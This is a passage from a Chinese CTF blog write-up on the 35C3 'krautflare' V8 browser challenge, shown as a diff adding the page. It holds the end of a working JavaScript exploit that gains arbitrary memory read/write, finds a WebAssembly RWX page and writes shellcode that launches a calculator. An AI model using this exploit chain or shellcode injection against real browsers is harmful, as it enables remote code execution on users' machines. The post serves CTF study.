class="number">0</span>, <span class="literal">true</span>));</span><br><span class="line">	&#125;</span><br><span class="line">	write64(addr,value)&#123;</span><br><span class="line">		oobArray[backing_store] = tC.u2f(addr);</span><br><span class="line">		<span class="comment">//let tmp = new Float64Array(buf,0,0x10);</span></span><br><span class="line">		<span class="comment">//tmp[0] = tC.u2f(value);</span></span><br><span class="line">		<span class="keyword">return</span> dataView.setFloat64(<span class="number">0</span>, tC.f2u(value), True);</span><br><span class="line">	&#125;</span><br><span class="line">	write(addr, payload)&#123;</span><br><span class="line">		oobArray[backing_store] = tC.u2f(addr);</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>; i&lt;payload.length; i++)&#123;</span><br><span class="line">			dataView.setUint8(i, payload[i]);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> wr = <span class="keyword">new</span> ArbitraryRW();</span><br><span class="line"><span class="comment">// ---------------build down -----------------</span></span><br><span class="line">wasmInsAddr = wr.leakObj(wasmInstance);</span><br><span class="line">success(<span class="string">"wasmIns_addr -&gt;"</span>,wasmInsAddr);</span><br><span class="line"><span class="comment">// %DebugPrint(wasmInstance);</span></span><br><span class="line">RWXAddr = wr.read64(wasmInsAddr+<span class="number">0xe8</span>);</span><br><span class="line">success(<span class="string">"RWXAddr -&gt;"</span>,RWXAddr);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">showCalc</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">var</span> shellcode = [<span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x48</span>, <span class="number">0xb8</span>, <span class="number">0x2f</span>, <span class="number">0x78</span>, <span class="number">0x63</span>, <span class="number">0x61</span>, <span class="number">0x6c</span>, <span class="number">0x63</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x50</span>, <span class="number">0x48</span>, <span class="number">0xb8</span>, <span class="number">0x2f</span>, <span class="number">0x75</span>, <span class="number">0x73</span>, <span class="number">0x72</span>, <span class="number">0x2f</span>, <span class="number">0x62</span>, <span class="number">0x69</span>, <span class="number">0x6e</span>, <span class="number">0x50</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xe7</span>, <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0x50</span>, <span class="number">0x57</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xe6</span>, <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xd2</span>, <span class="number">0x48</span>, <span class="number">0xc7</span>, <span class="number">0xc0</span>, <span class="number">0x3a</span>, <span class="number">0x30</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x50</span>, <span class="number">0x48</span>, <span class="number">0xb8</span>, <span class="number">0x44</span>, <span class="number">0x49</span>, <span class="number">0x53</span>, <span class="number">0x50</span>, <span class="number">0x4c</span>, <span class="number">0x41</span>, <span class="number">0x59</span>, <span class="number">0x3d</span>, <span class="number">0x50</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xe2</span>, <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0x50</span>, <span class="number">0x52</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xe2</span>, <span class="number">0x48</span>, <span class="number">0xc7</span>, <span class="number">0xc0</span>, <span class="number">0x3b</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0f</span>, <span class="number">0x05</span>, <span class="number">0x00</span>];</span><br><span class="line">	wr.write(RWXAddr, shellcode);</span><br><span class="line">	wasmFunc();</span><br><span class="line">&#125;</span><br><span class="line">showCalc();</span><br></pre></td></tr></table></figure></p>
+<p><img src="/2020/07/07/35c3-krautflare/003.png" alt="003"></p>
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://github.com/ray-cp/browser_pwn/tree/master/35c3ctf-krautflare" target="_blank" rel="noopener">raycp师傅的exploit</a><br><a href="https://7o8v.me/2019/10/30/35C3-CTF-krautflare-exploit/" target="_blank" rel="noopener">35C3 CTF krautflare exploit</a></p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/exploit/" rel="tag"># exploit</a>
+          
+            <a href="/tags/Browser/" rel="tag"># Browser</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/05/31/34c3-v9/" rel="next" title="34c3 v9">
+                <i class="fa fa-chevron-left"></i> 34c3 v9
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2099/01/01/Diary/" rel="prev" title="Diary">
+                Diary <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/header.jpg" alt="Eros John">
+            
+              <p class="site-author-name" itemprop="name">Eros John</p>
+              <div class="site-description motion-element" itemprop="description"></div>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">13</span>
+                    <span class="site-state-item-name">日志</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  
+                    
+                      <a href="/categories/">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">6</span>
+                    <span class="site-state-item-name">分类</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  
+                    
+                      <a href="/tags/">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">4</span>
+                    <span class="site-state-item-name">标签</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="https://github.com/erosjohn" title="GitHub &rarr; https://github.com/erosjohn" rel="noopener" target="_blank"><i class="fa fa-fw fa-globe"></i>GitHub</a>
+                </span>
+              
+            </div>
+          
+
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </div>
+
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#环境搭建"><span class="nav-number">1.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#漏洞分析"><span class="nav-number">2.</span> <span class="nav-text">漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Patch"><span class="nav-number">2.1.</span> <span class="nav-text">Patch</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Trigger"><span class="nav-number">2.2.</span> <span class="nav-text">Trigger</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#OOB"><span class="nav-number">2.3.</span> <span class="nav-text">OOB</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#漏洞利用"><span class="nav-number">3.</span> <span class="nav-text">漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#稳定的OOB"><span class="nav-number">3.1.</span> <span class="nav-text">稳定的OOB</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#AddrOf-amp-R-W"><span class="nav-number">3.2.</span> <span class="nav-text">AddrOf &amp; R/W</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#wasm"><span class="nav-number">3.3.</span> <span class="nav-text">wasm</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exploit"><span class="nav-number">3.4.</span> <span class="nav-text">exploit</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考链接"><span class="nav-number">4.</span> <span class="nav-text">参考链接</span></a></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+  
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Eros John</span>
+
+  
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+    
+
+    
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+
+  
+
+
+  <script src="/js/utils.js?v=7.1.0"></script>
+
+  <script src="/js/motion.js?v=7.1.0"></script>
+
+
+
+  
+  
+
+
+  <script src="/js/affix.js?v=7.1.0"></script>
+
+  <script src="/js/schemes/pisces.js?v=7.1.0"></script>
+
+
+
+
+  
+  <script src="/js/scrollspy.js?v=7.1.0"></script>
+<script src="/js/post-details.js?v=7.1.0"></script>
+
+
+
+  
+
+
+  <script src="/js/next-boot.js?v=7.1.0"></script>
+
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+
+  
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
